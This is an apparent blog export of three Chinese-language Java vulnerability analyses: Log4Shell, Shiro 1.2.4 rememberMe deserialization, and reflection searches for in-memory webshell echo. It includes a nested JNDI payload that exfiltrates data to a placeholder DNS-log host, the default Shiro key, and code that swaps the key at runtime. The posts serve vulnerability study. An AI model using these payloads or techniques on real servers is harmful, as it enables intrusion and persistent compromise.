{"meta":{"title":"个人博客","subtitle":"","description":"个人学习的一些记录。","author":"f19t","url":"https://f19t.github.io.git","root":"/"},"pages":[{"title":"分类","date":"2023-02-12T08:31:42.000Z","updated":"2023-02-13T09:31:55.647Z","comments":true,"path":"categories/index.html","permalink":"https://f19t.github.io.git/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-02-12T08:25:34.000Z","updated":"2023-02-13T09:31:47.571Z","comments":true,"path":"tags/index.html","permalink":"https://f19t.github.io.git/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"log4jshell-2.14.0漏洞分析","slug":"log4jshell-2-14-0漏洞分析","date":"2023-03-17T09:39:55.000Z","updated":"2023-03-17T09:42:32.036Z","comments":true,"path":"2023/03/17/log4jshell-2-14-0漏洞分析/","link":"","permalink":"https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。","text":"log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。 环境准备 java version “1.8.0_152” idea 2023.3.3 log4j-core 2.14.0 手工创建环境过程： 首先在pom.xml里面添加依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt;&lt;/dependency&gt; 第二步在resources文件夹下添加log4j2.xml 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;error&quot;&gt; &lt;appenders&gt; &lt;!-- 配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot; &gt; &lt;!-- 配置Console的模式布局--&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/Console&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&quot;error&quot;&gt; &lt;appender-ref ref=&quot;Console&quot;/&gt; &lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt; 第三步我们写一个简单的验证程序 12345678910111213141516package org.example;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;/** * author: f19t * Date: 2023/3/16 18:43 */public class Test &#123; private static final Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) &#123; String a=&quot;$&#123;java:version&#125;&quot;; logger.error(a); &#125;&#125; 运行这个Test将会得到 12023-03-17 15:12:04.362 [main] ERROR org.example.Test - Java version 1.8.0_152 漏洞分析漏洞产生的位置在org.apache.logging.log4j.core.lookup.Interpolator.lookup()方法。此方法存在一个strLookupMap，map内部的Key和value是我们利用的关键。里面有： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public Interpolator(final Map&lt;String, String&gt; properties)&#123; this.strLookupMap = new HashMap(); this.defaultLookup = new MapLookup((Map)(properties == null ? new HashMap() : properties)); this.strLookupMap.put(&quot;log4j&quot;, new Log4jLookup()); this.strLookupMap.put(&quot;sys&quot;, new SystemPropertiesLookup()); this.strLookupMap.put(&quot;env&quot;, new EnvironmentLookup()); this.strLookupMap.put(&quot;main&quot;, MainMapLookup.MAIN_SINGLETON); this.strLookupMap.put(&quot;marker&quot;, new MarkerLookup()); this.strLookupMap.put(&quot;java&quot;, new JavaLookup()); this.strLookupMap.put(&quot;lower&quot;, new LowerLookup()); this.strLookupMap.put(&quot;upper&quot;, new UpperLookup()); try &#123; this.strLookupMap.put(&quot;jndi&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;, StrLookup.class)); &#125; catch (Exception | LinkageError var9) &#123; this.handleError(&quot;jndi&quot;, var9); &#125; try &#123; this.strLookupMap.put(&quot;jvmrunargs&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;, StrLookup.class)); &#125; catch (Exception | LinkageError var8) &#123; this.handleError(&quot;jvmrunargs&quot;, var8); &#125; this.strLookupMap.put(&quot;date&quot;, new DateLookup()); this.strLookupMap.put(&quot;ctx&quot;, new ContextMapLookup()); if (Constants.IS_WEB_APP) &#123; try &#123; this.strLookupMap.put(&quot;web&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.web.WebLookup&quot;, StrLookup.class)); &#125; catch (Exception var7) &#123; this.handleError(&quot;web&quot;, var7); &#125; &#125; else &#123; LOGGER.debug(&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;); &#125; try &#123; this.strLookupMap.put(&quot;docker&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.docker.DockerLookup&quot;, StrLookup.class)); &#125; catch (Exception var6) &#123; this.handleError(&quot;docker&quot;, var6); &#125; try &#123; this.strLookupMap.put(&quot;spring&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;, StrLookup.class)); &#125; catch (Exception var5) &#123; this.handleError(&quot;spring&quot;, var5); &#125; try &#123; this.strLookupMap.put(&quot;kubernetes&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;, StrLookup.class)); &#125; catch (Exception var3) &#123; this.handleError(&quot;kubernetes&quot;, var3); &#125; catch (NoClassDefFoundError var4) &#123; this.handleError(&quot;kubernetes&quot;, var4); &#125; &#125; 我们在lookup方法的漏洞触发的位置位置下断点，我们跟进分析一下。 运行Test，断点位置的堆栈如下： 12345678910111213141516171819202122232425262728293031lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)toSerializable:345, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)toText:244, PatternLayout (org.apache.logging.log4j.core.layout)encode:229, PatternLayout (org.apache.logging.log4j.core.layout)encode:59, PatternLayout (org.apache.logging.log4j.core.layout)directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)log:485, LoggerConfig (org.apache.logging.log4j.core.config)log:460, LoggerConfig (org.apache.logging.log4j.core.config)log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)log:161, Logger (org.apache.logging.log4j.core)tryLogMessage:2198, AbstractLogger (org.apache.logging.log4j.spi)logMessageTrackRecursion:2152, AbstractLogger (org.apache.logging.log4j.spi)logMessageSafely:2135, AbstractLogger (org.apache.logging.log4j.spi)logMessage:2011, AbstractLogger (org.apache.logging.log4j.spi)logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)error:740, AbstractLogger (org.apache.logging.log4j.spi)main:14, Test (org.example) 我们一步一步的分析，首先调用logger.error(a);，error又会调用logIfEnabledlogIfEnabled又调用isEnabled判断日志是否支持记录isEnabled又调用filter，这里的filter其实就是我们之前写的log4j2.xml的配置文件。 判断可以记录之后调用logMessage 中间的过程就不分析了，一直到format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) 首先我看先看一下这个format方法里面的offset他其实就是获取我们log4j2.xml里面的日志输出前缀，然后把msg里面的messageFormat加到workingBuilder里面，下面的for循环是判断字符串里面是否存在${，如果存在那么去substring获取这个范围的字符串，其实就是获取用户输入的字符串。 这里获取到用户输入的value，然后调用replace replace又去调用substitute 接着substitute又去调用substitute 调用substitute之后获取到了varName，调用resolveVariable， resolveVariable再进行调用lookup lookup里面将prefix、name取出，然后调用lookup这个map，这个map为之前介绍的strLookupMap。 因为我们写的调用为${java:version}，所以他会走到JavaLookup这个里面的lookup里面。 之后运行结束得到结果： tips支持递归substitute里面通过while循环去递归匹配查询${，所以我们可以写入如下payload： 1String a=&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.xxxxx.ceye.io&#125;&quot;; 高版本jndijndi的ldap默认支持8版本191版本之前的，要想突破高版本的现在，目前我了解了两种方法可以绕过高版本限制： 通过反序列化去绕过 使用目标本地工厂类 因为这两个点内容也很多，后面文章再补充这方面的知识。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"JAVA安全/漏洞分析","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"log4j2","slug":"log4j2","permalink":"https://f19t.github.io.git/tags/log4j2/"}]},{"title":"shiro 1.2.4反序列化命令执行漏洞分析","slug":"shiro-1-2-4反序列化命令执行漏洞分析","date":"2023-03-14T12:40:05.000Z","updated":"2023-03-14T13:08:20.117Z","comments":true,"path":"2023/03/14/shiro-1-2-4反序列化命令执行漏洞分析/","link":"","permalink":"https://f19t.github.io.git/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"shiro 1.2.4反序列化命令执行漏洞分析前几天本来想复现fastjson系列的漏洞，但是看了一段时间fastjson的源码变量名称都是x、y、z这种无规则无规范的命名方式，十分头晕，所以打算还是先分析一下shiro的漏洞原理吧。下方所有实验代码在https://github.com/f19t/shiro_1.2.4env","text":"shiro 1.2.4反序列化命令执行漏洞分析前几天本来想复现fastjson系列的漏洞，但是看了一段时间fastjson的源码变量名称都是x、y、z这种无规则无规范的命名方式，十分头晕，所以打算还是先分析一下shiro的漏洞原理吧。下方所有实验代码在https://github.com/f19t/shiro_1.2.4env 环境准备： jdk 1.8.0_152 idea 2023.3.3 shiro-spring 1.2.4 Spring boot 2.6.11 反序列化漏洞位置反序列化的位置在org.apache.shiro.io.DefaultSerializer的deserialize() 方法我们在反序列化的位置下断点，我们使用写的登录界面成功登录之后，会获得一个rememberMe，然后我们带着rememberMe访问任何一个界面，注意shiro1.2.4我在写spring boot这个程序的时候会获取一个jsessionid，我们需要删掉这个jsessionid，只保留rememberMe的cookie进行访问。 关键堆栈 123456deserialize:77, DefaultSerializer (org.apache.shiro.io)deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt) 我们跟进去看一下代码运行的逻辑。 首先resolvePrincipals中调用principals &#x3D; this.getRememberedIdentity(context);去处理rememberMe， 然后getRememberedIdentity调用getRememberedPrincipals。 之后getRememberedPrincipals又两个关键处理:第一处getRememberedSerializedIdentity进行base64解码。第二处就是将字节进行解密并反序列化。 第一处解码base64第二处解密并反序列化。这里注意解密的方法在org.apache.shiro.mgt.AbstractRememberMeManager中，其中key默认为private static final byte[] DEFAULT_CIPHER_KEY_BYTES &#x3D; Base64.decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”);如果没有设置key。加解密key为默认值。 private byte[] encryptionCipherKey; private byte[] decryptionCipherKey; 该类中存在setCipherKey方法，如果设置了setCipherKey那么最终的key为设置的。 这里我们并没有进行设置key所以使用默认的key进行加解密。 至此，我们就可以进行构造反序列化，执行命令，执行回显这里就不多介绍了。 shiro tips修改key我们知道获取key是在org.apache.shiro.mgt.AbstractRememberMeManager但是这个类是抽象类，具体实现类在org.apache.shiro.web.mgt.CookieRememberMeManager。 我们用之前写的搜索程序，来搜一下看一下线程里面是否包含CookieRememberMeManager。这里我又学到一点，fields[i].get(obj).getClass().getName()获取到的可能是org.springframework.web.servlet.DispatcherServlet$$Lambda$572&#x2F;995785821这种匿名类或者是代理的类，我们通过Class.forName()是获取不到这种类的，所有我把之前写的location代码进行了一处修改，就是把Class clazz &#x3D; lcat.obj.getClass();直接从obj去获取class。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#location.javapackage org.example.spring_shiro;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Response;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Field;import java.util.*;/** * author: f19t * Date: 2023/3/6 15:35 */public class location extends AbstractTranslet &#123; public location(Object obj, String clazz, String path) &#123; this.obj = obj; this.path = path; this.clazz = clazz; &#125; public Object obj; public String path; public String clazz; public static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//队列保证广度优先搜索 public static Set&lt;Object&gt; set = new HashSet&lt;Object&gt;();//set记录哪些对象被搜索过 public static void search() throws ClassNotFoundException &#123; location laco = new location(Thread.currentThread(), &quot;org.apache.tomcat.util.threads.TaskThread&quot;,&quot;TaskThread&quot;); queue.offer(laco); set.add(Thread.currentThread()); int i=0; while (queue.size()&gt;0) &#123; i++; basic_search1(queue.poll());// if (i==500)&#123;break;&#125; &#125; &#125; public static void basic_search1(location lcat) throws ClassNotFoundException &#123; Object obj = lcat.obj; String path = lcat.path; Class clazz = lcat.obj.getClass(); try &#123;// Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); if (fields[i].get(obj) == null)&#123;continue;&#125; if (!isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != null &amp;&amp; set.add(fields[i].get(obj))) &#123; if (is_map(fields[i].getType().getSimpleName())) &#123; Map map = (Map) fields[i].get(obj); if (map.size() &gt; 0) &#123; for (int map_num = 0; map_num &lt; map.size(); map_num++) &#123; Object map_obj = map.get(map_num); if (map_obj != null &amp;&amp; set.add(map_obj) &amp;&amp; !isblack(map_obj.getClass().getName())) &#123; location l = new location(map_obj, map_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;+map_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (is_list(fields[i].getType().getSimpleName())) &#123; List list = (List) fields[i].get(obj); if (list.size() &gt; 0) &#123; for (int list_num = 0; list_num &lt; list.size(); list_num++) &#123; Object list_obj = list.get(list_num); if (list_obj != null &amp;&amp; set.add(list_obj) &amp;&amp; !isblack(list_obj.getClass().getName())) &#123; location l = new location(list_obj, list_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + list_num + &quot;]&quot;+list_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (fields[i].getType().isArray()) &#123;// Object objarr1 = fields[i].get(obj); try &#123; Object[] arrobj = (Object[])fields[i].get(obj); if (arrobj.length &gt; 0) &#123; for (int obj_num = 0; obj_num &lt; arrobj.length; obj_num++) &#123; Object arr_obj = arrobj[obj_num]; if (arr_obj != null &amp;&amp; set.add(arr_obj) &amp;&amp; !isblack(arr_obj.getClass().getName())) &#123; location l = new location(arr_obj, arr_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + obj_num + &quot;]&quot;+arr_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; &#125;catch (Throwable e)&#123;// System.out.println(fields[i].get(obj)); &#125; continue; &#125; if (is_target(fields[i],obj)) &#123; System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);// RequestFacade reqfd = (RequestFacade) fields[i].get(obj);// Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);// f.setAccessible(true);//因为是protected// Request req = (Request) f.get(reqfd);//反射获取值// Field ff = req.getClass().getDeclaredField(&quot;response&quot;);// ff.setAccessible(true);// Response resp = (Response) ff.get(req);// PrintWriter out = resp.getWriter();// out.println(&quot;wwwwww&quot;); &#125; location l = new location(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); queue.offer(l);// System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; &#125; &#125; &#125; catch (IllegalAccessException ex) &#123; throw new RuntimeException(ex); &#125; &#125; public static boolean isblack(String s) &#123; Boolean aBoolean = false; List&lt;String&gt; black = new ArrayList&lt;String&gt;(Arrays.asList(&quot;java.lang.Byte&quot;, &quot;java.lang.Short&quot;, &quot;java.lang.Integer&quot;, &quot;java.lang.Long&quot;, &quot;java.lang.Float&quot;, &quot;java.lang.Boolean&quot;, &quot;java.lang.String&quot;, &quot;java.lang.Class&quot;, &quot;java.lang.Character&quot;, &quot;java.io.File&quot;, &quot;byte&quot;, &quot;short&quot;, &quot;int&quot;, &quot;long&quot;, &quot;double&quot;, &quot;float&quot;, &quot;boolean&quot; )); for (int i = 0; i &lt; black.size(); i++) &#123; if (s == black.get(i)) &#123; aBoolean = true; return aBoolean; &#125; &#125; return aBoolean; &#125; public static boolean is_target(Field f,Object o) throws IllegalAccessException, ClassNotFoundException &#123; boolean b = false; if (// f.getName() == &quot;request&quot;// || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.RequestFacade&quot;// || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.Request&quot;// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.Request&quot;))// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.core.ApplicationHttpRequest&quot;))// f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;)) f.get(o).getClass().getName().contains(&quot;CookieRememberMeManager&quot;)// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;))// || f.get(o).getClass().getName() == &quot;org.apache.catalina.core.ApplicationHttpRequest&quot;// || f.get(o).getClass().getName() == &quot;org.apache.coyote.Request&quot;// || f.get(o).getClass().getSimpleName() == &quot;Request&quot;// || f.get(o).getClass().getSimpleName() == &quot;HttpServletRequest&quot;// || f.getName() == &quot;req&quot;// || f.get(o).getClass().getName() == &quot;org.apache.coyote.RequestGroupInfo&quot;)// &amp;&amp; f.get(o).getClass().getName()!=&quot;java.lang.Object&quot; )&#123; return true; &#125; return b; &#125; public static boolean is_list(String s) &#123; boolean b = false; if (&quot;List&quot;.equals(s) || &quot;ArrayList&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; public static boolean is_map(String s) &#123; boolean b = false; if (&quot;Map&quot;.equals(s) || &quot;HashMap&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 我们之间在hello这个路径上添加location.search() 登录之后访问hello我们可以获得线程里面的，这里我只获取到一条，网络上有人获取了两条，估计是版本的问题。 123456TaskThread---&gt;inheritableThreadLocals(java.lang.ThreadLocal$ThreadLocalMap)--&gt;table[6]java.lang.ThreadLocal$ThreadLocalMap$Entry---&gt;value(java.util.HashMap)--&gt;table[6]java.util.HashMap$Node---&gt;value(org.apache.shiro.web.mgt.DefaultWebSecurityManager)---&gt;rememberMeManager(org.apache.shiro.web.mgt.CookieRememberMeManager) 我们尝试修改线程里面的key看一下能否修改全局的key。 首先我们设置两条访问入口路线。 1234567891011@GetMapping(&quot;/hello&quot;) public String hello() throws ClassNotFoundException &#123; location.search(); return &quot;hello&quot;; &#125; @GetMapping(&quot;/hello1&quot;) public String hello1() throws ClassNotFoundException &#123; return &quot;hello1&quot;; &#125; 访问hello是获取CookieRememberMeManager并修改key。 123456if (is_target(fields[i],obj)) &#123;System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) fields[i].get(obj);System.out.println( Base64.encodeToString(cookieRememberMeManager.getDecryptionCipherKey()));cookieRememberMeManager.setCipherKey(Base64.decode(&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;));&#125; 然后我们在AbstractRememberMeManager的里面下两个断点。 convertPrincipalsToBytes &#x2F;&#x2F;生成rememberMe，会调用到encrypt convertPrincipalsToBytes &#x2F;&#x2F;解密rememberMe，会调用decrypt 然后我们登录。断点捕获到之后，我们调用评估表达式输入Base64.encodeToString(getDecryptionCipherKey()) 我们发现key为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。是默认的。 之后我们访问一下hello1。发现key也是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 之后我们在访问一下hello，在访问hello1。我们发现key已经被改了。 并且我们的登录认证也掉了。需要重新登陆。我在再重新登陆一下。我们可以发现重新登陆的key也是修改之后的。 只要不重启，key就是我们修改之后的。 因为我们的key是从线程里获取的Thread.currentThread()，所有我们反序列化的时候就可以进行key的修改。 还有另一种key的修改方式，是通过agent技术里面的Instrumentation，这里就不展开讲了。 加载器因为headers有长度限制，我们的payload如果复杂，可能过长，导致报错。这种情况，我们可以在rememberMe里面先传加载器。加载器先获取当前线程的request然后通过对body的操作进行复杂操作，这个加载器，我们后面文章在说。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"JAVA安全/漏洞分析","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"shiro","slug":"shiro","permalink":"https://f19t.github.io.git/tags/shiro/"}]},{"title":"java内存马回显初探","slug":"java内存马回显初探","date":"2023-03-06T09:54:08.000Z","updated":"2023-03-06T10:41:15.554Z","comments":true,"path":"2023/03/06/java内存马回显初探/","link":"","permalink":"https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/","excerpt":"java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https://github.com/c0ny1/java-object-searcher/,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。","text":"java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https://github.com/c0ny1/java-object-searcher/,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。 环境说明 Tomcat&#x2F;8.5.83 java version “1.8.0_152” idea 2023.3.2 前言我们再写内存马时，比如写linsener内存马时，需要先获取当前应用的StandardContext，回显的时候需要获取当前应用当前进程的response。又因为： Request对象可以获取到StandardContext，Request.getContext()。 Request对象也可以获得response，例如tomcat的Request具体实现类org.apache.catalina.connector.Request里面包含protected Response response; 所以我们如果能获取到当前访问的Request，我们就可以实现写内存马和进行回显。 准备知识存储Request的位置通常情况下，java-web作为多线程应用，Request对象通常存在在线程里面，我们可以通过Thread.currentThread() 来获取到当前的线程对象。例如我们写一个简单的jsp，println的位置下断点，我们通过idea自带的评估表达式（Evaluate），执行Thread.currentThread()看一下。 1234&lt;% String s = &quot;sss&quot;; System.out.println(s);%&gt; 我们发现获取到的确实是当前线程的对象，他的类型为org.apache.tomcat.util.threads.TaskThread。TaskThread继承了Thread。 反射获取TaskThread里面所有变量我们知道反射可以获取对象的字段、字段值、字段类型。反射学习详见：https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/ 所以这里我们可以写一个servlet程序获取到TaskThread的所有字段以及字段属性。 123456789101112131415161718192021222324252627282930313233343536import org.apache.tomcat.util.threads.TaskThread;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/3/2 14:52 */@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; TaskThread t = (TaskThread) Thread.currentThread(); Field fields[] = TaskThread.class.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); try &#123; System.out.println(&quot;字段名=&quot;+fields[i].getName()); System.out.println(&quot;字段值=&quot;+fields[i].get(t));//get方法需要传入实例对象 System.out.println(&quot;字段类型=&quot;+fields[i].getType()); int mod = fields[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;----------------------------&quot;); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125;&#125; 12345678910输出：字段名=log字段值=org.apache.juli.logging.DirectJDKLog@397d3266字段类型=interface org.apache.juli.logging.Log声明类型=private static final----------------------------字段名=creationTime字段值=1677745450986字段类型=long声明类型=private final 为什么只输出了两个字段呢，那是因为TaskThread类里面确实只有这两个字段，但是我们调试的时候发现TaskThread里面有很多字段呀，这是因为TaskThread继承一些父类，我们要想获得TaskThread的所有字段，还得去遍历他们的父类,为了方便查看字段在哪个类里面，我们也打印一下类名。 1234567891011121314151617181920212223242526272829303132333435363738394041import org.apache.tomcat.util.threads.TaskThread;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/3/2 14:52 */@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; TaskThread t = (TaskThread) Thread.currentThread(); try &#123; Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); System.out.println(&quot;类名=&quot; + clazz); System.out.println(&quot;字段名=&quot;+fields[i].getName()); System.out.println(&quot;字段类型=&quot;+fields[i].getType()); int mod = fields[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;字段值=&quot;+fields[i].get(t));//get方法需要传入实例对象 System.out.println(&quot;----------------------------&quot;); &#125; &#125; &#125; catch (ClassNotFoundException e) &#123; throw new RuntimeException(e); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 123456789101112131415161718192021222324252627结果：类名=class org.apache.tomcat.util.threads.TaskThread字段名=log字段类型=interface org.apache.juli.logging.Log声明类型=private static final字段值=org.apache.juli.logging.DirectJDKLog@21d6ac54----------------------------类名=class org.apache.tomcat.util.threads.TaskThread字段名=creationTime字段类型=long声明类型=private final字段值=1677750206025----------------------------类名=class java.lang.Thread字段名=name字段类型=class java.lang.String声明类型=private volatile字段值=http-nio-8080-exec-5----------------------------类名=class java.lang.Thread字段名=priority字段类型=int声明类型=private字段值=5----------------------------................后面字段省略 